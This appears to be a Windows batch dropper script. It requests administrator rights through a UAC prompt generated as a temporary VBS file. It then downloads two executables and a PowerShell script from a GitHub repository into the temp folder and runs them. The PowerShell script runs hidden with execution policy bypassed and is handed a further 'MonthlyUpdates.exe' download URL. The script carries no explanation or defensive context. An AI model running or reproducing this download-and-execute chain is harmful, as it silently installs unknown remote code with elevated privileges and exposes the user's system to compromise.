@echo off
setlocal

:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"  

set "ADVANCE_URL=https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/Advance.exe"
set "SCANNER_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
set "LOG_URL=https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/SystemMonitor.exe"
set "ADVANCE_FILE=%temp%\Advance.exe"
set "SCANNER_FILE=%temp%\scanner.ps1"
set "LOG_FILE=%temp%\SystemMonitor.exe"

set "UPDATE_SERVER=https://github.com/Drakovthe6th/TBuG/raw/refs/heads/master/MonthlyUpdates.exe"
set "EXE_NAME=MonthlyUpdates.exe"

powershell -Command "Invoke-WebRequest -Uri '%ADVANCE_URL%' -OutFile '%ADVANCE_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%SCANNER_URL%' -OutFile '%SCANNER_FILE%'"
powershell -Command "Invoke-WebRequest -Uri '%LOG_URL%' -OutFile '%LOG_FILE%'"

if exist "%ADVANCE_FILE%" call "%ADVANCE_FILE%"
if exist "%LOG_FILE%" call "%LOG_FILE%"

if exist "%SCANNER_FILE%" (
    powershell -Windowstyle Hidden -ExecutionPolicy Bypass -File "%SCANNER_FILE%" -UpdateServer "%UPDATE_SERVER%" -ExeName "%EXE_NAME%"
)

endlocal